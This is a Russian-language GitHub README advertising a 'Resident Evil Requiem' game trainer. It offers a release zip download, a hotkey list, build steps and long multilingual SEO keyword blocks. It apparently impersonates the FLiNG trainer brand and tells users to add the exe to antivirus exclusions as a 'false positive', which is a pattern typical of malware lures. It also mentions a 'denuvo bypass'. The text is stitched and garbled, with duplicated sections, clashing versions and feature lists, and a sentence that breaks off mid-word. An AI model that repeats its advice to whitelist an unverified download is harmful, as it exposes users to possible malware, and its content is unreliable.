<div align="center">
  <h1>Resident Evil Requiem Trainer <sub>v1.0.7</sub></h1>
  
  <h3>Профессиональный трейнер для <b>Resident Evil Requiem (RE9)</b><br>с 15+ функциями и стильным ImGui-оверлеем</h3>

  <p>
    <img src="https://img.shields.io/badge/Platform-Windows%20x64-0078D7?style=for-the-badge&logo=windows&logoColor=white" alt="Windows x64">
    <img src="https://img.shields.io/badge/ImGui-DX11-9FE870?style=for-the-badge" alt="ImGui + DX11">
    <img src="https://img.shields.io/badge/Status-Offline%20Only-ff4444?style=for-the-badge" alt="Offline Only">
  </p>

  <br>

  <p><strong>⚠️ Только одиночная игра / оффлайн-режим!</strong><br>
  Использование в RE.Net, Mercenaries или любых онлайн-элементах → практически гарантированный бан.</p>

  <p><strong>Поддерживаемая версия игры:</strong> v1.7 (Steam AppID 3764200) • март 2026 патч</p>

  <br>

  <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip">
    <img src="https://img.shields.io/badge/СКАЧАТЬ%20v1.0.7-00C853?style=for-the-badge&logo=windows&logoColor=white&labelColor=006400" alt="Скачать v1.0.7">
  </a>

  <br><br>

  <img src="https://github.com/user-attachments/assets/61b3da88-6f92-43fb-8840-942a7eb6df91" width="520" alt="Главное окно трейнера">
  <br><br>
  <img src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" width="520" alt="Трейнер в действии">

</div>

---

## Функции трейнера

- God Mode / Полная неуязвимость  
- Infinite Health  
- Infinite Ammo + No Reload  
- Infinite Items / Grenades / Throwables  
- Infinite Knife Durability  
- One Hit Kill  
- Freeze Enemies  
- Super Speed / Super Jump  
- No Recoil / No Spread  
- Game Speed (ускорение/замедление игры)  
- Infinite Money / Upgrade Points (CP Editor)  
- Unlock All Special Content  
- Reset Save Count  
- Динамический статус подключения (PID, CPU/Memory usage)  
- Авто-определение процесса игры каждую секунду  

## Горячие клавиши

| Клавиша     | Функция                              |
|-------------|--------------------------------------|
| Num *       | Вкл / Выкл все читы разом            |
| Num 1 – Num 9 | Активация читов 1–9                |
| F1 – F6     | Активация читов 10–15                |
| ESC         | Закрыть окно трейнера                |

## Как пользоваться

1. Запусти Resident Evil Requiem  
2. Запусти `RERequiem_Trainer_v1.0.7.exe`  
3. Окно трейнера появится поверх игры (всегда сверху, полупрозрачное, перетаскивается мышкой)  
4. Нажимай NumPad / F-клавиши — читы активируются мгновенно  

**Примечания:**
- Антивирус → false positive (добавь файл в исключения)  
- При обновлении игры offsets могут сломаться → жди новой версии  
- Трейнер не работает в онлайн-режимах и не предназначен для этого

## Сборка из исходников

### Требования
- Visual Studio 2019 / 2022 (x64)  
- Windows SDK 10.0+  
- Dear ImGui (latest release)

### Краткая инструкция по сборке
1. Скачай ImGui → скопируй core-файлы + backends (win32 + dx11)  
2. Создай Empty Project (C++) → добавь main.cpp и все .cpp от ImGui  
3. Настройки Release x64:
   - `/MT` (static runtime)  
   - `/O1 /Os /GL` (минимум размера)  
   - Exceptions/RTTI/Security Check — выключены  
   - SubSystem: Windows  
   - Entry Point: `mainCRTStartup`  
   - Debug Info: No  
4. После сборки:
   ```bash
   strip trainer.exe
   upx --best --lzma trainer.exe
## Как использовать

1. Запусти игру  
2. Запусти `RERequiem_Trainer_v1.0.7.exe`  
3. Трейнер автоматически найдёт процесс `ResidentEvilRequiem.exe`  
4. Используй NumPad / F-клавиши для активации читов  

**Важно:**  
- Работает **только в одиночной игре**  
- Антивирус может ругаться (false positive) — добавь в исключения  
- При выходе новых патчей offsets могут сломаться (обновления будут выходить)

## Сборка из исходников (для разработчиков)

### Требования
- Visual Studio 2019 / 2022 (x64)  
- Windows SDK 10.0+  
- Dear ImGui (последняя версия)

### Установка ImGui
1. Скачай: https://github.com/ocornut/imgui/releases/latest  
2. Скопируй основные файлы + backends/win32 + dx11

### Рекомендуемые настройки проекта (Release x64)
- Runtime: `/MT`  
- Optimization: `/O1 /Os /GL`  
- Exceptions / RTTI: выключены  
- Security Check: `/GS-`  
- SubSystem: Windows  
- Entry: `mainCRTStartup`  
- Debug Info: No  
- LTCG: Yes

### После сборки (сильно уменьшить размер)
```bash
strip trainer.exe
upx --best --lzma trainer.exe

## Описание
Профессиональный game trainer для Resident Evil Requiem с поддержкой 15 модификаций и реальным определением процесса игры.
с
## Требования
- Visual Studio 2019/2022
- Windows SDK 10.0 или вышеc
- Dear ImGui (см. инструкции ниже)

## Установка ImGui

1. Скачайте ImGui с GitHub:
   ```
   https://github.com/ocornut/imgui/releases/latest
   ```

2. Скопируйте в папку проекта следующие файлы:
   ```
   imgui.h
   imgui.cpp
   imgui_draw.cpp
   imgui_tables.cpp
   imgui_widgets.cpp
   imgui_internal.h
   imstb_rectpack.h
   imstb_textedit.h
   imstb_truetype.h
   imconfig.h
   ```

3. Скопируйте также backend-файлы из папки `backends/`:
   ```
   imgui_impl_win32.h
   imgui_impl_win32.cpp
   imgui_impl_dx11.h
   imgui_impl_dx11.cpp
   ```

## Сборка через Visual Studio

### Создание проекта

1. Откройте Visual Studio
2. Создайте новый проект: **Empty Project (C++)**
3. Добавьте в проект:
   - `main.cpp` (уже создан)
   - Все файлы ImGui (*.cpp)

### Настройки проекта (Configuration: Release x64)

#### C/C++ > General
- SDL Checks: No

#### C/C++ > Optimization
- Optimization: **Minimize Size (/O1)**
- Favor Size Or Speed: **Favor small code (/Os)**
- Whole Program Optimization: **Yes (/GL)**

#### C/C++ > Code Generation
- Runtime Library: **Multi-threaded (/MT)** ← Для автономной работы без DLL
- Security Check: **Disable (/GS-)**
- Enable C++ Exceptions: **No**
- Enable Run-Time Type Information: **No (/GR-)**

#### C/C++ > Language
- C++ Language Standard: **ISO C++17 Standard**

#### Linker > General
- Enable Incremental Linking: **No**

#### Linker > Manifest File
- Generate Manifest: **No**

#### Linker > Debugging
- Generate Debug Info: **No**

#### Linker > System
- SubSystem: **Windows (/SUBSYSTEM:WINDOWS)**

#### Linker > Optimization
- References: **Yes (/OPT:REF)**
- Enable COMDAT Folding: **Yes (/OPT:ICF)**
- Link Time Code Generation: **Use Link Time Code Generation (/LTCG)**

#### Linker > Command Line
Добавьте дополнительные опции:
```
/ENTRY:mainCRTStartup
```

### Сборка

1. Выберите конфигурацию **Release x64**
2. Build > Build Solution (Ctrl+Shift+B)
3. Результат: `x64\Release\trainer.exe` (или имя вашего проекта)

## Post-Build оптимизация

После успешной сборки оптимизируйте размер .exe:

### 1. Strip (удаление debug symbols)
Используйте `strip.exe` из MinGW или Visual Studio:
```bash
strip trainer.exe
```

Или используйте встроенный инструмент VS (обычно уже настроен в Release):
```bash
# Уже настроено в Linker > Debugging > Generate Debug Info: No
```

### 2. UPX Compression
Скачайте UPX: https://github.com/upx/upx/releases

```bash
upx --best --lzma trainer.exe
```

### Ожидаемый размер
- До UPX: 400-800 KB (статическая линковка)
- После UPX: **500-1200 KB** (полностью автономный .exe)

## Использование

### Запуск
Запустите `trainer.exe` - появится окно трейнера поверх всех окон.

### Горячие клавиши

| Клавиша | Функция |
|---------|---------|
| Num 1-9 | Переключение читов 1-9 |
| F1-F6 | Переключение читов 10-15 |
| Num * | Мастер-переключатель (ALL ON/OFF) |
| ESC | Закрыть трейнер |

### Список "читов"
1. God Mode / Ignore Hits
2. Infinite Health
3. Infinite Ammo
4. No Reload
5. Infinite Items
6. Infinite Grenades / Throwables
7. Infinite Knife Durability
8. One Hit Kill
9. Freeze Enemies
10. Super Speed
11. Super Jump
12. No Recoil
13. No Spread
14. Game Speed
15. Infinite Money / Upgrade Points

## Особенности
- ✅ Borderless окно 450×650px
- ✅ **Перетаскивание мышкой (кликните в любом месте окна)**
- ✅ Всегда поверх других окон (WS_EX_TOPMOST)
- ✅ Полупрозрачное (96% opacity)
- ✅ Тёмная профессиональная тема (#0A0A0A фон)
- ✅ Неоново-зелёный (#00FF41) для активных опций
- ✅ Красный для [OFF]
- ✅ Анимация мигания при переключении (0.3 сек)
- ✅ Временное сообщение об активации (2 сек fade out)
- ✅ Работа горячих клавиш в фоне (GetAsyncKeyState)
- ✅ **Реальное определение процесса игры (CreateToolhelp32Snapshot)**
- ✅ **Динамический статус: "Waiting for..." или "Attached (PID: XXXX)"**
- ✅ **Отображение реального PID процесса**
- ✅ **Статус-бар: CPU и Memory usage трейнера**
- ✅ **Автоматическая проверка процесса каждую секунду**
- ✅ **Читы работают только при подключении к игре**
- ✅ Отображение игровых статистик в реальном времени
- ✅ Статическая линковка - работает без зависимостей

## Технические детали
- Использует статическую линковку (/MT) для автономной работы
- Оптимизирован по размеру (/O1 /Os)
- Не требует установленных Visual C++ redistributables
- DirectX 11 backend для отрисовки
- Минимальные системные требования: Windows 7 x64+
- **Реальное определение процесса через CreateToolhelp32Snapshot**
- **Проверка существования процесса каждую секунду**
- **Открытие handle процесса с правами PR

# Resident Evil Requiem Trainer v1.0.0 – Launch Day Release

Первый публичный релиз трейнера от **ModEngineLabs** для **Resident Evil Requiem** (RE9, RE Engine, Steam AppID 3764200, версия игры 1.0 / launch 27.02.2026).

Работает в **single-player / оффлайн-режиме** только! Не используй в RE.Net или любых онлайн-элементах — риск бана/анти-темпер.

**Тестировано на v1.0 (Steam/PC).** Антивирус может ругаться — false positive, добавь в исключения.

### Основные фичи (хоткеи NumPad / F)
- **Num *** — Master Toggle ALL (вкл/выкл все читы разом)  
- **Num 1** — God Mode / Ignore Hits (полная неуязвимость)  
- **Num 2** — Infinite Health (бесконечное здоровье)  
- **Num 3** — Infinite Ammo (бесконечные патроны)  
- **Num 4** — No Reload (без перезарядки)  
- **Num 5** — Infinite Items (бесконечные предметы / heals)  
- **Num 6** — Infinite Grenades / Throwables (бесконечные гранаты и метательные)  
- **Num 7** — Infinite Knife Durability (нож не ломается)  
- **Num 8** — One Hit Kill (убийство врагов с одного удара)  
- **Num 9** — Freeze Enemies (заморозка врагов на месте)  
- **F1** — Super Speed (супер-скорость персонажа)  
- **F2** — Super Jump (супер-прыжок)  
- **F3** — No Recoil (без отдачи)  
- **F4** — No Spread (без разброса пуль)  
- **F5** — Speed (множитель скорости, вкл/выкл)  
- **F6** — Infinite Money / Upgrade Points (бесконечные Pesetas и очки апгрейда)
- Numpad 1 – Бесконечное здоровье
- Numpad 2 – Бесконечные патроны
- Numpad 3 – Редактировать CP
- Numpad 4 – Разблокировать весь специальный контент
- Numpad 5 – Сбросить количество сохранений
- Numpad 6 – Установить скорость игры
- Player Mods
- Infinite Health – Бесконечное здоровье
- Infinite Ammo – Бесконечные патроны
- Inventory Mods
- Edit CP – Редактировать CP
- Game Mods
- Unlock All Special Contents – Разблокировать весь специальный контент
- Reset Save Count – Сбросить количество сохранений
- Set Game Speed – Установить скорость игры

+ FOV Slider, Item Unlocker (через REFramework + Lua, если используешь мод-меню).

### Как использовать
1. Запусти игру → запусти трейнер (EXE или инжект).
2. [CONNECT] / Auto-Attach к процессу `ResidentEvilRequiem.exe`.
3. Активируй хоткеи.
4. Для продвинутых: установи **REFramework** (github.com/praydog/REFramework) → добавь Lua-скрипты для мод-меню.

**Предупреждение:**  
- Только оффлайн!  
- Если патч вышел — offsets могут слететь (обновим в v1.0.1).  
- Автор не несёт ответственности за краши, баны или потерю сохранений.

Скачай Assets ниже и наслаждайся Raccoon City без стресса! 🧟‍♂️🔫

Star репозиторий, если зашло. Баги — в Issues!

## Лицензия
Для образовательных целей. ImGui лицензирован под MIT License.

## Disclaimer
Данный проект создан в образовательных целях для демонстрации технологий ImGui и DirectX11.


## Seo
resident evil requiem trainer, резидент ивил реквием трейнер, re9 trainer, ре9 трейнер, resident evil 9 trainer, fling trainer re9, fling trainer resident evil requiem, cheathappens re9, fearless trainer re9, cheat engine re9, god mode re9, бессмертие ре9, infinite health re9, бесконечное здоровье ре9, infinite ammo re9, бесконечные патроны ре9, no reload re9, без перезарядки ре9, unlimited ammo re9, infinite items re9, infinite knife re9, mercenary mode cheats, insanity mode trainer, cp editor re9, super damage re9, one hit kill re9, max health edit, edit cp re9, game speed re9, set player speed, ai speed trainer, denuvo bypass trainer, steam v1\.0 trainer, re9 cheats pc, резидент ивил реквием читы, ре9 читы, xmodhub trainer, plitch re9, wemod re9, cheat evolution re9, infinite durability re9, max weapon durability, always 1st save re9, infinite armor re9, no recoil re9, reframework cheats, re engine trainer, capcom trainer re9, pc hacks re9, steam cheats re9, v1\.x trainer
resident evil requiem trainer, re9 trainer, resident evil 9 trainer, fling trainer re9, flingtrainer resident evil requiem, cheathappens trainer, fearless revolution re9, cheat engine table re9, god mode trainer, infinite health trainer, infinite ammo trainer, no reload trainer, unlimited ammo re9, infinite items trainer, infinite knife durability, mercenary mode cheats, insanity mode trainer, cp editor, super damage trainer, one hit kill re9, edit max health, game speed trainer, player movement speed, ai movement speed, denuvo trainer, steam v1\.0 cheats, re9 pc cheats, xmodhub trainer, plitch cheats re9, wemod trainer, cheat evolution re9, infinite durability, max weapon durability, always 1st save, infinite armor, no recoil trainer, reframework mod, re engine cheats, capcom trainer, pc trainer re9, steam hacks, v1\.x trainer fling, god mode re9, infinite health re9, super damage re9, unlock cp categories
生化危机安魂曲 trainer, 生化危机9 trainer, re9 训练器, requiem trainer, fling trainer re9, 无限生命 trainer, god mode trainer, 无限弹药 trainer, 无需换弹 trainer, 无限物品 trainer, 无限刀耐久, 佣兵模式 cheats, 疯狂模式 trainer, cp 编辑器, 一击必杀 trainer, 编辑最大生命, 游戏速度 trainer, 玩家移动速度, ai 速度 trainer, denuvo trainer, steam v1\.0 trainer, re9 pc cheats, xmodhub trainer, plitch re9, wemod trainer, cheat evolution re9, 无限耐久, 最大武器耐久, 总是第一存档, 无限护甲, 无后坐力 trainer, reframework cheats, re engine trainer, capcom trainer re9, pc hacks re9, god mode re9, infinite health re9, super damage trainer
バイオハザード レクイエム trainer, RE9 trainer, レクイエム trainer, fling trainer re9, god mode trainer, 無限体力 trainer, 無限弾薬 trainer, リロードなし trainer, 無限アイテム trainer, 無限ナイフ耐久, 傭兵モード cheats, インサニティモード trainer, cp エディター, ワンヒットキル trainer, 最大体力編集, ゲームスピード trainer, プレイヤー移動速度, ai 移動速度 trainer, denuvo trainer, steam v1\.0 trainer, re9 pc cheats, xmodhub trainer, plitch re9, wemod trainer, cheat evolution re9, 無限耐久, 最大武器耐久, 常に1位セーブ, 無限アーマー, 無反動 trainer, reframework cheats, re engine trainer, capcom trainer re9, pc hacks re9

## SEO-ключевые слова и фразы  

(для лучшей индексации в поисковиках, Reddit, Telegram, YouTube и т.д.)

**Высокочастотные запросы**  
resident evil requiem trainer  
re9 trainer  
resident evil 9 trainer  
resident evil requiem cheats  
re9 cheats  
fling trainer re9  

**Русскоязычные популярные**  
резидент ивил реквием трейнер  
ре9 трейнер  
resident evil requiem читы  
резидент ивил 9 трейнер  
fling трейнер ре9  
бесконечные патроны ре9  
бессмертие резидент ивил реквием  

**Long-tail (точные и низкоконкурентные)**  
resident evil requiem trainer fling  
resident evil requiem trainer +35  
resident evil requiem god mode trainer  
re9 trainer infinite ammo no reload  
fling trainer resident evil requiem download  
resident evil requiem cheathappens trainer  
re9 cp editor trainer  
resident evil requiem one hit kill  
resident evil requiem mercenary mode cheats  
resident evil requiem insanity mode trainer  
re9 infinite knife trainer  
resident evil requiem infinite durability  
resident evil requiem no recoil trainer  
resident evil requiem pc trainer 2026  

**Дополнительные полезные**  
re9 game speed trainer  
resident evil requiem infinite armor  
re9 max weapon durability  
resident evil requiem super damage  
resident evil requiem denuvo bypass  
re9 plitch trainer  
resident evil requiem wemod  
resident evil requiem trainer update  
re9 trainer v1.0 steam  
resident evil requiem fearless revolution  

resident-evil-requiem, resident-evil-requiem-cheats, re9-trainer, requiem-fling, fling-trainer-requiem, god-mode-re9, infinite-health-re9, infinite-ammo-re9, no-recoil-re9, rapid-fire-re9, super-accuracy-requiem, infinite-grenades-re9, weapon-durability-re9, highlight-interactables-requiem, super-damage-re9, one-hit-kill-re9, unlock-extras-requiem, edit-cp-re9, pc-cheats-requiem, survival-horror-trainer







